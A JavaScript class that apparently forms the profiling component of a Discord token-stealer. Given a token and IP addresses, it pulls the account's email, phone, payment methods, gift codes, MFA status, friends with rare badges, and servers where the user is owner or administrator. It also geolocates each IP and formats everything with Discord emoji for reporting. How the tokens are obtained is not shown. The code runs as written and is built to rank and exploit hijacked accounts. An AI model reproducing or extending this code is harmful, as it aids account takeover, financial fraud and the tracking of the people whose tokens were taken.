"use strict";

module.exports = class DiscordToken {
  constructor(token, ipAddress) {
    const [
      user,
      profile,
      settings,
      paymentSources,
      relationships,
      guilds,
      applications,
      connections,
      entitlements,
    ] = [
      this.getDiscordApi("https://discord.com/api/v9/users/@me", token),
      this.getDiscordApi(`https://discord.com/api/v9/users/${Buffer.from(token.split(".")[0], "base64",).toString()}/profile`, token),
      this.getDiscordApi("https://discord.com/api/v9/users/@me/settings", token),
      this.getDiscordApi("https://discord.com/api/v9/users/@me/billing/payment-sources", token),
      this.getDiscordApi("https://discordapp.com/api/v9/users/@me/relationships", token,),
      this.getDiscordApi("https://discord.com/api/v9/users/@me/guilds?with_counts=true", token),
      this.getDiscordApi("https://discord.com/api/v9/applications", token),
      this.getDiscordApi("https://discordapp.com/api/v9/users/@me/connections", token),
      this.getDiscordApi("https://discord.com/api/v8/users/@me/entitlements/gifts", token),
    ];

    if (ipAddress) {
      if (Array.isArray(ipAddress)) {
        this.ipInfos = ipAddress.map((ip) => this.getIpInfoAll(ip));
      } else {
        this.ipInfo = this.getIpInfoAll(ipAddress);
      }
    }

    if (!user || user === "Invalid") {
      this.info = { message: "Token not found" };
      return;
    }

    const creditCard = paymentSources?.some((source) => source.brand && source.invalid === 0);
    const paypal = paymentSources?.some((source) => source.email);

    this.emojis = {
      themes: {
        dark: "Dark",
        light: "Light",
      },
      status: {
        online: "<:online:1129709364316491787>",
        idle: "<:idle:1120542710424674306>",
        dnd: "<:dnd:974692691289993216>",
        invisible: "<:offline:1137141023529762916>",
      },
      user: {
        boost: [
          "<:Booster1Month:1087043238654906472> ",
          "<:Booster2Month:1087043319227494460> ",
          "<:Booster3Month:1087043368250511512> ",
          "<:Booster6Month:1087043493236592820> ",
          "<:Booster9Month:1087043493236592820> ",
          "<:booster12month:1162420359291732038> ",
          "<:Booster15Month:1051453775832961034> ",
          "<:Booster18Month:1051453778127237180> ",
          "<:Booster24Month:1051453776889917530> ",
        ],
        payments: [
          "<a:card:1083014677430284358> ",
          "<:paypal:1129073151746252870> ",
        ],
        i: [
          "<:staff:1090015968618623129> ",
          "<:partner:918207395279273985> ",
          "<:events:898186057588277259> ",
          "<:bughunter_1:874750808426692658> ",
          "<:bravery:874750808388952075> ",
          "<:brilliance:874750808338608199> ",
          "<:balance:874750808267292683> ",
          "<:early:944071770506416198> ",
          "<:bughunter_2:874750808430874664> ",
          "<:activedev:1042545590640324608> ",
          "<:verifieddeveloper:898181029737680896> ",
        ],
      },
    };

    this.paymentSources = "";
    this.paymentSources = creditCard ? this.emojis.user.payments[0] : "";
    this.paymentSources += paypal ? this.emojis.user.payments[1] : "Paypal Not Found";

    this.info = {
      token: token,
      ID: user.id,
      globalName: `${user.global_name}`,
      avatarDecoration: `${user.avatar_decoration_data ? user.avatar_decoration_data : "Avatar-Decoration Not Found"}`,
      username: `${user.username}#${user.discriminator}`,
      badges: this.AllBadges(user.flags),
      nitroType: this.getNitroPremium(profile),
      avatar: user.avatar ? this.getImage(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`) : "Avatar Not Found",
      banner: user.banner ? this.getImage(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`) : "Banner Not Found",
      totalFriend: relationships.filter((relation) => relation.type === 1).length,
      totalBlocked: relationships.filter((relation) => relation.type === 2).length,
      pending: relationships.filter((relation) => relation.type === 3).length,
      NitroGifts: entitlements[0] ? entitlements.map((gift) => `${gift}, `).join("") : "Codes-Gifts Not Found",
      totalOwnedGuild: guilds.filter((guild) => guild.owner).length,
      totalApplication: applications.length,
      totalConnection: connections.length,
      totalGuild: guilds.length,
      NSFW: user.nsfw_allowed ? "🔞 `Allowed`" : "❌ `Not allowed`",
      MFA2: user.mfa_enabled ? "✅ `Allowed`" : "❌ `Not allowed`",
      verified: user.verified ? "✅" : "❌",
      bio: user.bio || "Bio Not Found",
      phone: user.phone || "Phone Not Found",
      mail: user.email,
      billing: this.paymentSources,
      langue: this.getLanguage(settings.locale),
      status: this.getStatusEmoji(settings.status),
      theme: this.getTheme(settings.theme),
      gifts: this.getGiftsCodes(token, settings),
    };
    this.guilds = {
      all: this.getGuilds(guilds).all,
      rares: this.getGuilds(guilds).rare,
    };
    this.friends = {
      all: "Unfinished",
      rares: this.rareFriend(relationships),
    };
    if (ipAddress) {
      if (Array.isArray(ipAddress)) {
        if (this.ipInfos.some((info) => !info.success)) {
          this.info.IPs = {
            message: "Unknown IPs",
            success: this.ipInfos.success,
          };
          return;
        }
        this.info.IPs = this.ipInfos.map((info) => ({
          ip: info.ip,
          success: info.success,
          type: info.type,
          continent: info.continent,
          continent_code: info.continent_code,
          country: info.country,
          country_code: info.country_code,
          country_capital: info.country_capital,
          country_phone: info.country_phone,
          country_neighbours: info.country_neighbours,
          region: info.region,
          city: info.city,
          latitude: info.latitude,
          longitude: info.longitude,
          asn: info.asn,
          org: info.org,
          isp: info.isp,
          timezone: info.timezone,
          timezone_name: info.timezone_name,
          timezone_dstOffset: info.timezone_dstOffset,
          timezone_gmtOffset: info.timezone_gmtOffset,
          timezone_gmt: info.timezone_gmt,
          currency_code: info.currency_code,
          currency_rates: info.currency_rates,
          currency_plural: info.currency_plural,
        }));
      } else {
        if (!this.ipInfo.success) {
          this.info.IP = {
            message: "Unknown IP",
            success: this.ipInfo.success,
          };
          return;
        }
        this.info.IP = {
          ip: this.ipInfo.ip,
          success: this.ipInfo.success,
          type: this.ipInfo.type,
          continent: this.ipInfo.continent,
          continent_code: this.ipInfo.continent_code,
          country: this.ipInfo.country,
          country_code: this.ipInfo.country_code,
          country_capital: this.ipInfo.country_capital,
          country_phone: this.ipInfo.country_phone,
          country_neighbours: this.ipInfo.country_neighbours,
          region: this.ipInfo.region,
          city: this.ipInfo.city,
          latitude: this.ipInfo.latitude,
          longitude: this.ipInfo.longitude,
          asn: this.ipInfo.asn,
          org: this.ipInfo.org,
          isp: this.ipInfo.isp,
          timezone: this.ipInfo.timezone,
          timezone_name: this.ipInfo.timezone_name,
          timezone_dstOffset: this.ipInfo.timezone_dstOffset,
          timezone_gmtOffset: this.ipInfo.timezone_gmtOffset,
          timezone_gmt: this.ipInfo.timezone_gmt,
          currency_code: this.ipInfo.currency_code,
          currency_rates: this.ipInfo.currency_rates,
          currency_plural: this.ipInfo.currency_plural,
        };
      }
    }   
  }

  getLanguage(locale) {
    const languages = {
      "zh-TW": "🇨🇳 Chinese-Taiwanese",
      "pr-BR": "🇵🇹 Portuguese",
      "sv-SE": "🇸🇪 Swedish",
      "zh-CN": "🇨🇳 Chinese-China",
      "en-GB": "🪟 English (UK)",
      "en-US": "🇺🇸 USA",
      "es-ES": "🇪🇸 Español",
      ro: "🇷🇴 Romanian",
      fi: "🇫🇮 Finnish",
      vi: "🇻🇳 Vietnamese",
      tr: "🇹🇷 Turkish",
      ru: "🇷🇺 Russian",
      uk: "🇺🇦 Ukrainian",
      hi: "🇮🇳 Indian",
      th: "🇹🇼 Taiwanese",
      hr: "🇭🇷 Croatian",
      it: "🇮🇹 Italianio",
      lt: "🇱🇹 Lithuanian",
      no: "🇳🇴 Norwegian",
      ja: "🇯🇵 Japanese",
      ko: "🇰🇷 Korean",
      fr: "🇫🇷 French",
      da: "🇩🇰 Dansk",
      de: "🇩🇪 Deutsch",
      pl: "🇵🇱 Polish",
      cs: "🇨🇿 Czech",
      el: "🇬🇷 Greek",
      bg: "🇧🇬 Bulgarian",
      hu: "🇳🇴🇭🇺 Hungarian",
    };
    return languages[locale] || "Unknown Language";
  }

  getStatusEmoji(status) {
    return this.emojis.status[status];
  }

  getTheme(theme) {
    return this.emojis.themes[theme] || "Unknown Theme";
  }

  getGiftsCodes(token, settings) {
    const result = [];
    const gifts = this.getDiscordApi(`https://discord.com/api/v9/users/@me/outbound-promotions/codes?locale=${settings.locale}`, token);
    gifts?.forEach((gift) => {
      result.push({
        name: gift.promotion.outbound_title,
        code: gift.code,
      });
    });
    return result;
  }

  getImage(url) {
    if (!url) return false;
    const re = require("sync-fetch")(url);
    return `${url}.${re.headers.get("content-type").includes("image/gif") ? "gif" : "png"}?size=512`;
  }

  getGuilds(guilds) {
    const rare = guilds.filter((server) => server.owner || (server.permissions & 8) === 8).filter((server) => server.approximate_member_count >= 500).map((server) => ({
      id: server.id,
      name: server.name,
      owner: server.owner,
      member_count: server.approximate_member_count,
    }));
    const all = guilds.filter((server) => (server.permissions & 2048) === 2048).map((server) => ({
      id: server.id,
      name: server.name,
      owner: server.owner,
      member_count: server.approximate_member_count,
    }));
    const formatGuilds = (listed, x) => listed.length ? listed.map((server) => {
      return x ? `${server.owner && x ? "<:owner:963333541343686696>" : "<:staff:846569357353680896>"} | **${server.name}** - \`${server.id}\` | **Members** \`${server.member_count}\`` : `${server.owner ? "<:owner:963333541343686696> " : ""}**${server.name}** - \`${server.id}\` | **Members** \`${server.member_count}\``
    }).join("\n") : "Not Found";
    return {
      all: formatGuilds(all, false),
      rare: formatGuilds(rare, true),
    };
  }

  rareFriend(relationships) {
    let result = "";
    const friendRelationships = relationships.filter(
      (relationship) => relationship.type === 1,
    );
    for (const relationship of friendRelationships) {
      const badges = this.rareFriendadges(relationship.user.public_flags);
      if (badges !== "Not Found") {
        result += `${badges} ${relationship.user.username}#${relationship.user.discriminator}\n`;
      }
    }
    return result || "Not Found";
  }

  getIpInfoAll(ipAddress) {
    const url = `http://ipwhois.app/json/${ipAddress}`;
    const res = require("sync-fetch")(url);
    if (res.status === 200) {
      return res.json();
    } else return "Not Found";
  }

  getDiscordApi(url, token) {
    const res = require("sync-fetch")(url, {
      method: "GET",
      headers: {
        "Content-Type": "application/json",
        authorization: token,
      },
    });
    const d = res.json();
    return res.status === 200 ? d : "Invalid";
  }

  AllBadges(flags) {
    let result = "";
    if (1 & flags) result += this.emojis.user.i[0];
    if (2 & flags) result += this.emojis.user.i[1];
    if (4 & flags) result += this.emojis.user.i[2];
    if (8 & flags) result += this.emojis.user.i[3];
    if (64 & flags) result += this.emojis.user.i[4];
    if (128 & flags) result += this.emojis.user.i[5];
    if (256 & flags) result += this.emojis.user.i[6];
    if (512 & flags) result += this.emojis.user.i[7];
    if (16384 & flags) result += this.emojis.user.i[8];
    if (4194304 & flags) result += this.emojis.user.i[9];
    if (131072 & flags) result += this.emojis.user.i[10];
    return result || ":x:";
  }

  rareFriendadges(flags) {
    let result = "";
    if (1 & flags) result += this.emojis.user.i[0];
    if (2 & flags) result += this.emojis.user.i[1];
    if (4 & flags) result += this.emojis.user.i[2];
    if (8 & flags) result += this.emojis.user.i[3];
    if (512 & flags) result += this.emojis.user.i[7];
    if (16384 & flags) result += this.emojis.user.i[8];
    if (4194304 & flags) result += this.emojis.user.i[9];
    if (131072 & flags) result += this.emojis.user.i[10];
    return result || "Not Found";
  }

  getNitroPremium(user) {
    const { premium_type, premium_guild_since } = user;
    switch (premium_type) {
      default:
        return ":x:";
      case 1:
        return "<:nitro:1016385399020601344>";
      case 2:
        if (!premium_guild_since) return "<:nitro:1016385399020601344>";
        const now = new Date();
        const boostDurations = [2, 3, 6, 9, 12, 15, 18, 24];
        let remainingBoosts = 0;
        for (let i = 0; i < boostDurations.length; i++) {
          const duration = boostDurations[i];
          const boostStartDate = new Date(premium_guild_since);
          const boostEndDate = this.getDate(boostStartDate, duration);
          const daysRemaining = Math.round((boostEndDate - now) / 86400000);
          if (daysRemaining > 0) {
            remainingBoosts = i;
            break;
          }
        }
        return `<:nitro:1016385399020601344> ${this.emojis.user.boost[remainingBoosts]}`;
    }
  }

  getDate(s, m) {
    return new Date(s).setMonth(s.getMonth() + m);
  }
};
